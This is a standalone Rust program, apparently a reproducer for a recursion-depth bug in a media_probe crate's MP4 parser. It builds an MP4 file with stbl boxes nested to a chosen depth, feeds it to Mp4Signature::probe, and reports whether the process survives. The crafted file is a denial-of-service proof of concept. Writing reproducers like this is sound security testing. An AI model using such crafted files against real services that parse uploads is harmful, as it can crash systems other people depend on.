// Standalone: find_stsd_entry recursion depth in Mp4Signature::probe.
// Crafts ftyp + moov > trak > mdia > minf > stbl(stbl(stbl(...))) and
// calls Mp4Signature::probe directly with an arbitrary window.
use media_probe::signature::Mp4Signature;
use media_probe::signature::ProbePlugin;
use media_probe::SourceMeta;

fn box_bytes(kind: &[u8; 4], payload: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(8 + payload.len());
    out.extend_from_slice(&((8 + payload.len()) as u32).to_be_bytes());
    out.extend_from_slice(kind);
    out.extend_from_slice(payload);
    out
}

fn fullbox(kind: &[u8; 4], body: &[u8]) -> Vec<u8> {
    let mut payload = vec![0u8; 4];
    payload.extend_from_slice(body);
    box_bytes(kind, &payload)
}

fn ftyp() -> Vec<u8> {
    let mut payload = Vec::new();
    payload.extend_from_slice(b"isom");
    payload.extend_from_slice(&0u32.to_be_bytes());
    payload.extend_from_slice(b"isom");
    box_bytes(b"ftyp", &payload)
}

fn hdlr(handler: &[u8; 4]) -> Vec<u8> {
    let mut body = vec![0u8; 4];
    body.extend_from_slice(handler);
    body.extend_from_slice(&[0u8; 12]);
    fullbox(b"hdlr", &body)
}

/// A chain of `depth` nested stbl boxes; the innermost contains nothing.
fn nested_stbl(depth: usize) -> Vec<u8> {
    let mut cur = Vec::new(); // innermost payload: empty
    for _ in 0..depth {
        cur = box_bytes(b"stbl", &cur);
    }
    cur
}

fn deep_file(depth: usize) -> Vec<u8> {
    let stbl = nested_stbl(depth);
    let mut minf = Vec::new();
    minf.extend(fullbox(b"vmhd", &[0u8; 8]));
    minf.extend(stbl);
    let mut mdia = Vec::new();
    mdia.extend(fullbox(b"mdhd", &[0u8; 20]));
    mdia.extend(hdlr(b"soun"));
    mdia.extend(box_bytes(b"minf", &minf));
    let mut trak = Vec::new();
    trak.extend(fullbox(b"tkhd", &[0u8; 80]));
    trak.extend(box_bytes(b"mdia", &mdia));
    let mut moov_inner = Vec::new();
    moov_inner.extend(fullbox(b"mvhd", &[0u8; 96]));
    moov_inner.extend(trak);
    let mut file = Vec::new();
    file.extend(ftyp());
    file.extend(box_bytes(b"moov", &moov_inner));
    file
}

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let depth: usize = if args.len() > 1 {
        args[1].parse().unwrap_or(100)
    } else {
        100
    };
    let file = deep_file(depth);
    println!(
        "depth={} file_len={} (window this call: the whole slice)",
        depth,
        file.len()
    );
    let hit = Mp4Signature.probe(&file, &SourceMeta::new(None, None));
    match hit {
        Some(h) => println!(
            "probe returned: format={} score={} hints={} consumed={}",
            h.format.as_str(),
            h.score,
            h.track_hints.len(),
            h.prefix_consumed
        ),
        None => println!("probe returned None"),
    }
    println!("SURVIVED depth {}", depth);
}
